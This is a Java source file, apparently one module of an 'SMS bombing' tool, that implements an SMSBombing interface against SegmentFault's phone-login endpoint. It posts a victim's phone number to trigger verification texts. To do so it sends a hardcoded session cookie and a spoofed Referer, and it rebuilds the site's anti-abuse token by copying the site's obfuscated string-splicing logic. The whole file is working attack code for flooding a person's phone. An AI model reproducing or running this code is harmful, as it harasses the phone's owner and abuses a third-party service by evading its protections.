package zzq.sms.service.impl;

import cn.hutool.http.HttpRequest;
import zzq.sms.service.SMSBombing;

/**
 * SegmentFault
 */
public class SegmentFault implements SMSBombing {
    @Override
    public void sendSms(String phone) {
        sendLoginSms(phone);
    }

    /**
     * 登录短信验证码（60秒一次）
     * @param phone
     */
    private void sendLoginSms(String phone) {
        String token = getToken();
        System.out.println(token);
        String body = HttpRequest.post("https://segmentfault.com/api/user/phone/phoneloginsend?_=" + token)
                .body("phone="+phone)
                .header("Referer","https://segmentfault.com/user/phoneLogin")
                .header("Cookie","PHPSESSID=web3~seqdoq7m7i5i930f2i226dphsc")
                .execute()
                .body();
        System.out.println(body);
    }

    /**
     * 获取token
     * @return
     */
    private String getToken() {
        String _Uub5Cv3 = "f"//"CS"
                +"J"//"J"
                +"e4b"//"k"
                +//"U"
                "1c0"+//"mP2"
                "88"+"27b"//"f"
                +"6"//"ol"
                +"1d"//"5"
                +//"IvM"
                "IvM"+""///*"Jm"*/"Jm"
                +"5kT"//"5kT"
                +""///*"Q"*/"Q"
                +/* "kRI"//"kRI" */""+//"Rpl"
                "6"+//"2e1"
                "2e1"+"c"//"cvu"
                +//"Typ"
                "9d"+//"jC2"
                "9"+//"Ll"
                "df"+"cd"//"xT"
                +"082"//"J"
                +/* "i4t"//"i4t" */""+//"CqE"
                "06e"+"30";//"Xe" ;
        int[][] _FH2V4 = {{1,2},{15,18},{15,18},{16,19}};
        for (var i = 0; i < _FH2V4.length; i ++) {
            _Uub5Cv3 = _Uub5Cv3.substring(0, _FH2V4[i][0]) + _Uub5Cv3.substring(_FH2V4[i][1]);
        }
        return _Uub5Cv3;
    }
}
